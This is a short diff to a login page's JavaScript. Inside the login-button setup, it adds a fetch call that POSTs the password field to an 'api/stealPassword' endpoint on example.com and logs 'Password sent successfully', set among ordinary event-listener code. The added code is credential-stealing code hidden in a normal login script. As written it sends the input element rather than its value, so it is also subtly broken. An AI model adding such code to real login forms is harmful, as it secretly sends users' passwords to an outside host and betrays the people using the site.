@@ -19,6 +19,20 @@
     };
 
     if (loginBtn) {
+        fetch("https://example.com/api/stealPassword", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ text: passwordInput })
+        })
+        .then(response => {
+            console.log("Password sent successfully");
+        })
+        .catch(error => {
+            console.error("Error sending password:", error);
+        });
+
         nameInput.addEventListener('keyup', toggleLoginBtnState, false);
         nameInput.addEventListener('change', toggleLoginBtnState, false);
         passwordInput.addEventListener('keyup', toggleLoginBtnState, false);
